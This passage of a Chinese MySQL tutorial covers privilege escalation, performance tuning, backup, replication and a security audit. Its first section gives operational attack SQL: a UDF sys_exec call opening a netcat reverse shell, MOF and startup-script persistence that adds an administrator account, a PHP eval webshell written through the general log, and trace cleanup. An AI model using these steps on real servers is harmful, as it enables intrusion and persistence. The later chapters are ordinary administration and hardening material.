-- 将 UDF 文件内容以 hex 编码写入
SELECT 0x7f454c46...（UDF文件的hex编码） 
INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 步骤3：创建自定义函数
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';

-- 步骤4：执行命令
SELECT sys_eval('whoami');
SELECT sys_eval('id');
SELECT sys_exec('nc -e /bin/bash 192.168.1.1 4444');

-- 步骤5：清理痕迹
DROP FUNCTION sys_eval;
DROP FUNCTION sys_exec;
DELETE FROM mysql.func WHERE name LIKE 'sys_%';
```

### 13.2 MOF 提权（Windows 专用）

```sql
-- MOF（Managed Object Format）提权利用 Windows WMI 机制
-- 仅适用于 Windows + MySQL 有写入权限

-- 步骤1：写入 MOF 文件
SELECT 0x23707261676D61206E616D657370616365288942（...MOF文件的hex编码...）
INTO DUMPFILE 'C:\\Windows\\system32\\wbem\\mof\\evil.mof';

-- MOF 文件内容会自动被 WMI 服务执行
-- 每5秒重试一次，持续执行

-- MOF 文件示例结构：
// #pragma namespace("\\\\.\\root\\subscription")
// #pragma namespace("\\\\.\\root\\subscription")
// instance of __EventFilter as $F {
//     EventNamespace = "root\\cimv2";
//     Name = "evil";
//     Query = "SELECT * FROM __InstanceModificationEvent "
//             "WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"";
//     QueryLanguage = "WQL";
// };
// instance of ActiveScriptEventConsumer as $C {
//     Name = "evil";
//     ScriptingEngine = "JScript";
//     ScriptText = "var sh = new ActiveXObject(\"Shell.Application\");"
//                  "sh.ShellExecute(\"cmd.exe\",\"/c net user hacker P@ss /add\",null,null,0);";
// };
// instance of __FilterToConsumerBinding { Filter=$F; Consumer=$C; };
```

### 13.3 启动项提权

```sql
-- 利用 MySQL 写入启动项文件
-- Windows:
SELECT 0x...（bat文件的hex编码）
INTO DUMPFILE 'C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\update.bat';

-- bat 文件内容：net user hacker P@ss123 /add && net localgroup administrators hacker /add

-- Linux:
SELECT 0x...（bash脚本的hex编码）
INTO DUMPFILE '/etc/profile.d/update.sh';

-- 需要等待系统重启或用户登录后执行
```

### 13.4 日志文件提权

```sql
-- 利用 MySQL 日志功能写 WebShell

-- 步骤1：开启通用日志
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';

-- 步骤2：执行包含 PHP 代码的查询
SELECT '<?php @eval($_POST["cmd"]); ?>';

-- 步骤3：关闭日志
SET GLOBAL general_log = 'OFF';

-- 日志文件中会包含 PHP 代码，访问即可执行
```

---

## 第十四章：MySQL 性能优化

### 14.1 慢查询分析

```sql
-- 开启慢查询日志
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 1;  -- 超过1秒的查询
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- 分析慢查询日志
-- 使用 mysqldumpslow 工具
-- mysqldumpslow -s t -t 10 /var/log/mysql/slow.log
-- -s t: 按时间排序
-- -t 10: 显示前10条

-- 查看当前执行的查询
SHOW PROCESSLIST;
SHOW FULL PROCESSLIST;

-- 杀掉慢查询
KILL <process_id>;
```

### 14.2 EXPLAIN 执行计划

```sql
-- 查看执行计划
EXPLAIN SELECT * FROM users WHERE email = 'test@example.com';

-- 关键字段分析
-- id: 查询序号（越大越先执行）
-- select_type: 查询类型（SIMPLE/PRIMARY/SUBQUERY/DERIVED）
-- table: 表名
-- type: 访问类型（system > const > eq_ref > ref > range > index > ALL）
-- possible_keys: 可能使用的索引
-- key: 实际使用的索引
-- key_len: 使用索引的长度
-- ref: 索引比较的列
-- rows: 估算扫描行数
-- Extra: 额外信息（Using index/Using where/Using temporary/Using filesort）

-- 索引优化分析
EXPLAIN SELECT * FROM users WHERE username = 'admin' AND age > 18;
-- 如果 type=ALL → 需要优化索引
-- 如果 key=NULL → 没有使用索引

-- 强制使用索引
SELECT * FROM users FORCE INDEX(idx_username) WHERE username = 'admin';
-- 忽略索引
SELECT * FROM users IGNORE INDEX(idx_username) WHERE username = 'admin';
```

### 14.3 索引优化策略

```sql
-- 1. 联合索引最左前缀原则
-- 索引：INDEX(a, b, c)
-- 生效：WHERE a=1
-- 生效：WHERE a=1 AND b=2
-- 生效：WHERE a=1 AND b=2 AND c=3
-- 不生效：WHERE b=2
-- 不生效：WHERE c=3
-- 部分生效：WHERE a=1 AND c=3（仅 a 生效）

-- 2. 覆盖索引（Using index）
CREATE INDEX idx_cover ON users(username, email, age);
SELECT username, email, age FROM users WHERE username = 'admin';
-- Extra: Using index → 直接从索引获取数据，不需要回表

-- 3. 前缀索引（长字符串优化）
CREATE INDEX idx_url ON articles(LEFT(url, 20));

-- 4. 函数索引（MySQL 8.0+）
CREATE INDEX idx_date ON articles((DATE(created_at)));

-- 5. 避免索引失效的常见错误
-- 不使用函数：WHERE YEAR(created_at)=2024 → 索引失效
-- 改为范围查询：WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01'
-- 不使用运算：WHERE id + 1 = 10 → 索引失效
-- 改为：WHERE id = 9
-- 不使用类型转换：WHERE phone = 13800138000（字符串列用数字查询）
-- 改为：WHERE phone = '13800138000'
-- 不使用 LIKE 左模糊：WHERE name LIKE '%abc' → 索引失效
-- 改为右模糊：WHERE name LIKE 'abc%'
```

### 14.4 查询优化

```sql
-- 1. 使用 LIMIT 限制结果
SELECT * FROM users LIMIT 10;

-- 2. 避免 SELECT *
SELECT id, username, email FROM users WHERE id = 1;

-- 3. 使用 JOIN 替代子查询
-- 慢：子查询
SELECT * FROM users WHERE id IN (SELECT user_id FROM orders);
-- 快：JOIN
SELECT u.* FROM users u INNER JOIN orders o ON u.id = o.user_id;

-- 4. 批量插入替代循环插入
INSERT INTO users(name) VALUES('a'),('b'),('c'),('d');

-- 5. 使用 INSERT ... ON DUPLICATE KEY UPDATE
INSERT INTO counters(id, count) VALUES(1, 1)
ON DUPLICATE KEY UPDATE count = count + 1;

-- 6. 使用 EXPLAIN 验证优化效果
```

---

## 第十五章：MySQL 备份与恢复

### 15.1 逻辑备份

```bash
# mysqldump 备份
mysqldump -u root -p database_name > backup.sql

# 备份多个数据库
mysqldump -u root -p --databases db1 db2 db3 > backup.sql

# 备份所有数据库
mysqldump -u root -p --all-databases > all_backup.sql

# 仅备份表结构
mysqldump -u root -p --no-data database_name > schema.sql

# 仅备份数据
mysqldump -u root -p --no-create-info database_name > data.sql

# 压缩备份
mysqldump -u root -p database_name | gzip > backup.sql.gz

# 备份存储过程和触发器
mysqldump -u root -p --routines --triggers database_name > backup.sql

# 恢复
mysql -u root -p database_name < backup.sql
# 或在 MySQL 中
mysql> source /path/to/backup.sql;
```

### 15.2 物理备份

```bash
# 使用 Percona XtraBackup（热备份）
# 全量备份
innobackupex --user=root --password=xxx /backup/full

# 增量备份
innobackupex --user=root --password=xxx --incremental /backup/inc \
    --incremental-basedir=/backup/full

# 恢复准备
innobackupex --apply-log /backup/full
innobackupex --apply-log --redo-only /backup/full \
    --incremental-dir=/backup/inc

# 恢复数据
innobackupex --copy-back /backup/full
chown -R mysql:mysql /var/lib/mysql/
```

### 15.3 二进制日志恢复（PITR）

```bash
# 查看二进制日志
mysqlbinlog --start-datetime="2024-01-01 10:00:00" \
            --stop-datetime="2024-01-01 12:00:00" \
            /var/lib/mysql/mysql-bin.000123 | mysql -u root -p

# 按 position 恢复
mysqlbinlog --start-position=1000 \
            --stop-position=2000 \
            /var/lib/mysql/mysql-bin.000123 | mysql -u root -p

# 查看指定位置的事件
mysqlbinlog --base64-output=DECODE-ROWS -v \
            /var/lib/mysql/mysql-bin.000123
```

### 15.4 备份安全建议

```bash
# 1. 备份文件加密
mysqldump -u root -p database_name | openssl enc -aes-256-cbc -salt -out backup.sql.enc

# 2. 远程备份
mysqldump -u root -p database_name | ssh user@remote "cat > /backup/backup.sql"

# 3. 定时备份（crontab）
# 每天凌晨2点备份
0 2 * * * mysqldump -u root -pPASSWORD database_name | gzip > /backup/db_$(date +\%Y\%m\%d).sql.gz

# 4. 保留策略（保留最近7天）
find /backup -name "db_*.sql.gz" -mtime +7 -delete
```

---

## 第十六章：MySQL 高可用架构

### 16.1 主从复制

```
主从复制原理：

Master（主库）
  ├── 写入 binlog
  └── Binlog Dump Thread → 发送 binlog 事件

Slave（从库）
  ├── IO Thread → 接收 binlog，写入 relay log
  └── SQL Thread → 读取 relay log，执行 SQL

配置步骤：
  1. 主库开启 binlog，创建复制用户
  2. 主库记录 binlog 位置（SHOW MASTER STATUS）
  3. 从库配置 CHANGE MASTER TO
  4. 从库启动复制（START SLAVE）
```

```sql
-- 主库配置
-- my.cnf
-- [mysqld]
-- server-id = 1
-- log_bin = mysql-bin
-- binlog_format = ROW

-- 创建复制用户
CREATE USER 'repl'@'192.168.1.%' IDENTIFIED BY 'ReplP@ss123!';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'192.168.1.%';
FLUSH PRIVILEGES;

-- 查看主库状态
SHOW MASTER STATUS;
-- 输出：File=mysql-bin.000001, Position=154

-- 从库配置
-- my.cnf
-- [mysqld]
-- server-id = 2
-- relay_log = relay-bin
-- read_only = 1

-- 配置主库信息
CHANGE MASTER TO
    MASTER_HOST='192.168.1.10',
    MASTER_PORT=3306,
    MASTER_USER='repl',
    MASTER_PASSWORD='ReplP@ss123!',
    MASTER_LOG_FILE='mysql-bin.000001',
    MASTER_LOG_POS=154;

-- 启动复制
START SLAVE;

-- 查看复制状态
SHOW SLAVE STATUS\G
-- 关键检查项：
-- Slave_IO_Running: Yes
-- Slave_SQL_Running: Yes
-- Seconds_Behind_Master: 0
```

### 16.2 读写分离

```
读写分离架构：

         应用层
           │
     [ProxySQL/MySQL Router]
      /              \
  Master            Slaves
  (写操作)         (读操作)
   │                  │
   └── 复制 ──────────┘

ProxySQL 配置：
  - INSERT/UPDATE/DELETE → Master
  - SELECT → Slave（负载均衡）

优点：
  - 分担主库读压力
  - 提高查询并发
  - 主库故障可切换
```

### 16.3 高可用方案对比

| 方案 | 一致性 | 可用性 | 性能 | 复杂度 | 适用场景 |
|------|--------|--------|------|--------|---------|
| **主从复制** | 最终 | 中 | 高 | 低 | 读多写少 |
| **半同步复制** | 强 | 高 | 中 | 中 | 金融交易 |
| **MHA** | 最终 | 高 | 高 | 中 | 中小规模 |
| **MGR (Group Replication)** | 强 | 高 | 中 | 高 | 高可用集群 |
| **Galera Cluster** | 强 | 高 | 中 | 高 | 多主写入 |
| **MySQL InnoDB Cluster** | 强 | 高 | 中 | 高 | 官方推荐 |

---

## 第十七章：MySQL 安全审计

### 17.1 安全配置检查清单

```sql
-- 1. 检查用户安全
SELECT user, host, 
       CASE WHEN authentication_string='' THEN '空密码!' ELSE 'OK' END AS password_status
FROM mysql.user;

-- 2. 检查匿名用户
SELECT user, host FROM mysql.user WHERE user='';

-- 3. 检查远程 root
SELECT user, host FROM mysql.user 
WHERE user='root' AND host NOT IN ('localhost','127.0.0.1','::1');

-- 4. 检查 FILE 权限用户
SELECT user, host FROM mysql.user WHERE File_priv='Y';

-- 5. 检查 SUPER 权限用户
SELECT user, host FROM mysql.user WHERE Super_priv='Y';

-- 6. 检查 GRANT 权限用户
SELECT user, host FROM mysql.user WHERE Grant_priv='Y';

-- 7. 检查所有非 root 用户的权限
SELECT user, host, 
       Select_priv, Insert_priv, Update_priv, Delete_priv,
       Create_priv, Drop_priv, Alter_priv, File_priv, Super_priv
FROM mysql.user 
WHERE user NOT IN ('root','mysql.sys','mysql.session','mysql.infoschema');

-- 8. 检查测试数据库
SHOW DATABASES LIKE 'test%';

-- 9. 检查 secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- 10. 检查 local_infile
SHOW VARIABLES LIKE 'local_infile';

-- 11. 检查 bind-address
SHOW VARIABLES LIKE 'bind_address';

-- 12. 检查 SSL
SHOW VARIABLES LIKE '%ssl%';
SELECT user, host, ssl_type FROM mysql.user;
```

### 17.2 审计插件配置

```sql
-- 安装审计插件（MySQL Enterprise Audit 或 MariaDB Audit Plugin）

-- MariaDB Audit Plugin
INSTALL PLUGIN server_audit SONAME 'server_audit.so';

-- 配置审计
SET GLOBAL server_audit_events = 'CONNECT,QUERY,TABLE';
SET GLOBAL server_audit_logging = ON;
SET GLOBAL server_audit_file_path = '/var/log/mysql/audit.log';
SET GLOBAL server_audit_file_rotate_size = 100000000;  -- 100MB
SET GLOBAL server_audit_file_rotations = 10;           -- 保留10个文件

-- 查看审计配置
SHOW VARIABLES LIKE 'server_audit%';

-- 审计日志格式：
-- 20240101 10:00:00,localhost,user,connect,OK,123456
-- 20240101 10:00:01,localhost,user,query,OK,SELECT * FROM users WHERE id=1
-- 20240101 10:00:02,localhost,user,query,FAILED,DROP TABLE users
```

### 17.3 安全加固脚本

```bash
#!/bin/bash
# mysql_hardening.sh — MySQL 安全加固脚本

MYSQL_CMD="mysql -u root -p"

echo "===== MySQL 安全加固 ====="

# 1. 删除匿名用户
echo "[1] 删除匿名用户..."
$MYSQL_CMD -e "DELETE FROM mysql.user WHERE User='';"
$MYSQL_CMD -e "DELETE FROM mysql.db WHERE User='';"

# 2. 删除测试数据库
echo "[2] 删除测试数据库..."
$MYSQL_CMD -e "DROP DATABASE IF EXISTS test;"

# 3. 禁止 root 远程登录
echo "[3] 禁止 root 远程登录..."
$MYSQL_CMD -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost','127.0.0.1','::1');"

# 4. 修改 root 密码（可选，需手动执行）
echo "[4] 请手动修改 root 密码：ALTER USER 'root'@'localhost' IDENTIFIED BY 'NewStrongPassword!';"

# 5. 刷新权限
echo "[5] 刷新权限..."
$MYSQL_CMD -e "FLUSH PRIVILEGES;"

echo "===== 加固完成 ====="
echo "请检查 my.cnf 配置文件中的安全设置"
```

---

> ⚠️ **安全提示**：本文档中的所有技术和方法仅用于授权的安全测试和教学研究。MySQL 注入和提权技术在实际环境中可能造成严重的数据泄露和系统破坏。在未获得明确授权的情况下，不得对任何 MySQL 数据库使用上述技术。
